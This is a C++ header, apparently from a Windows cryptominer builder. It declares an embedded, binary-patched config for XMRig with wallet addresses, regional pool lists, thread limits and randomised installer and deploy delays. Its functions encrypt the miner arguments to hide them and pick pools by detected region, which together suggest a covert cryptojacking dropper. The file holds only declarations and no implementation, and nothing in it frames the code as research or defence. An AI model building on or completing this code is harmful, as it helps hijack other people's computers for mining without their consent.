#pragma once
#include <cstdint>
#include <string>
#include <random>
#include <iostream>
#include <vector>
#include <Windows.h>

#define maxPoolsPerZone 4
#define maxName 1024
#define maxAddrs 5
#define maxCustomArgs 3

struct minerConfig
{
    uint64_t pointer = 15811494920322472813;

    char addrs[maxAddrs][maxName];

    char americaWestPools[maxPoolsPerZone][maxName];
    char americaEastPools[maxPoolsPerZone][maxName];
    char europePools[maxPoolsPerZone][maxName];
    char asiaPools[maxPoolsPerZone][maxName];

    char customArgs[maxCustomArgs][maxName*2];

    char additionalArgs[maxName];

    uint8_t americaWestPoolsNum;
    uint8_t americaEastPoolsNum;
    uint8_t europePoolsNum;
    uint8_t asiaPoolsNum;

    uint8_t customArgsNum;

    uint8_t maxThreads;
    uint32_t L3CachePerThread;
    uint32_t lightModeRam;

    uint32_t installerDelayMin;
    uint32_t installerDelayMax;

    uint8_t minerDeployDelayMin;
    uint8_t minerDeployDelayMax;

    bool configured;
};

struct settings
{
    std::string addrs[maxAddrs];

    std::string americaWestPools[maxPoolsPerZone];
    std::string americaEastPools[maxPoolsPerZone];
    std::string EuropePools[maxPoolsPerZone];
    std::string AsiaPools[maxPoolsPerZone];

    std::string additionalArgs;

    int maxThreads;
    int L3CachePerThread;
    int lightModeRam;

    int installerDelayMin;
    int installerDelayMax;

    int minerDeployDelayMin;
    int minerDeployDelayMax;

    std::string customArgs[maxCustomArgs];
};

/*Light encryption just to avoid miner plain text arguments*/
void configLightEncrypt(minerConfig* mConfigp, int magick54, bool mode = true);

/*Light decryption*/
void configLightDecrypt(minerConfig* mConfigp, int magick54);

/*finds and replaces instance of minerConfig in an array*/
void replaceMinerConfig(minerConfig* mConfigp, char** bin, size_t size);

/*detects current region then randomly selects a pool for mining for that region*/
void selectPoolByLocation(minerConfig* config, std::string* primaryPool, std::string* backupPool);

/*returns how much threads to use for mining*/
uint32_t determineThreadsToMine(uint8_t maxCPUUsage, uint32_t L3CachePerThread);

/*returns fully constructed arguments for XMRig*/
std::string constructArguments(minerConfig* mConfigp);

/*populates settings from minerConfig*/
void settingsFromConfig(minerConfig* mConfig, settings* s1);

/*populates minerConfig from settings*/
void generateSettings(minerConfig* mConfig, settings* settings);

/*returns randomed int, tries to avoid exception supplied*/
int randomAnInt(int min, int max, int exception = -1);